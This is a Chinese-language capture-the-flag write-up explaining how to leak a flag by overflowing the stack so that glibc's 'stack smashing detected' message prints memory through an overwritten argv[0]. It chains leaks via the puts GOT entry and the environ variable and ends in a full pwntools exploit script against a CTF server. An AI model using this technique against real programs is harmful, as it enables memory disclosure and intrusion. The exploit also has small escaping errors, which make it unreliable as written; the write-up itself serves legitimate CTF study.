这题是2.23版本的但是我因为我版本跟2.23的不一样，所以就偏移啥的都不一样，所以就下面引用了被人的文章作为解释，解释如下：

![[Pasted image 20241202224349.png]]


![[Pasted image 20241202223810.png]]

这题就三次输入的机会，而且还有canary的保护，主体中是用的fork实现的三次输入，而且是存在溢出，但是有一点就是我们得不到canary的值，这是因为我们我们没法泄露，puts函数泄露不了，这里面就用到了environ这个全局变量表了，这个表保存了很多的消息，例如path的路径，等等，我们需要这题是需要canary的报错的，

![[Pasted image 20241202225855.png]]

如果不满足就会报错退出，但是在报错退出的时候，会打印出一点东西，stack smashing报错，为了让大家看的更直观，我们不妨直接运行看看
![[Pasted image 20241202230025.png]]

可以看到，打印出了一点东西，这也就是我们需要利用的，因为我们没有别的方法去输入，就要用到canary报错输出，而如果是在根目录，其实你会看到程序名，

![[Pasted image 20241202230056.png]]

实际上这个文件名是由argv[0]指向的。只要通过栈溢出用自己构造的字符串地址覆盖掉argv[0]就能打印相应的字符串。这是前置知识，至于argv[0],不用过多了解，只需要知道这是一个参数即可。

源码如下：
```
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

为什么要知道这个呢，因为程序报错是必然的，我们没有任何办法泄露canary，如果不利用这一点，我们什么都做不了。

#### 思路分析

我们有三次机会，首先先确定一点，第一就是我们需要泄露栈地址才可以泄露出flag，我们在我们只有输出的情况下，只能泄露environ变量里面的libc了，因为这里面的libc和别的地方的偏移是不会变的，所以第一步，先利用这个打印，泄露出libc，第二次再打印environ里面的栈地址，最后经过计算，我们把flag的地址放过去。
![[Pasted image 20241202230138.png]]
方框里面就是文件的地址。

exp
```
from pwn import *

from LibcSearcher import*

#io=process('./pwn')

io=remote('node5.buuoj.cn',25673)

elf=ELF('pwn')

puts=elf.got['puts']

payload1=b'a'*0x128+p64(puts)

io.recv()

#gdb.attach(io,"b *0x400B23")

io.sendline(payload1)

puts_addr=u64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))

print(hex(puts_addr))

libc = LibcSearcher("puts",puts_addr)

libc_base = puts_addr - libc.dump("puts")

environ = libc_base + libc.dump("environ")

payload2=b'a'*0x128+p64(environ)

io.sendline(payload2)

flag=u64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))-0x168

print(hex(flag))

payload3=b'a'*0x128+p64(flag)

io.recv()

io.sendline(payload3)

io.recv()

io.interactive()
```

